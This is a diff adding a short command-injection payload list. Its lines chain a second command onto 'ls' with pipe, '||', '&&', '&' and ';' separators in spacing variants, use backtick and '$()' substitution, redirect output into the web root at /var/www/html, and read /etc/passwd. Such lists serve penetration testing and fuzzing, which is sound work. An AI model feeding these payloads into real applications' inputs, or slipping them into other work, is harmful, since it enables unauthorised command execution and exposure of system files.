@@ -1,0 +1,9 @@
+ls||id; ls ||id; ls|| id; ls || id
+ls|id; ls |id; ls| id; ls | id
+ls&&id; ls &&id; ls&& id; ls && id
+ls&id; ls &id; ls& id; ls & id
+`ls` # ``
+$(ls) # $()
+ls; id
+> /var/www/html/out.txt
+< /etc/passwd
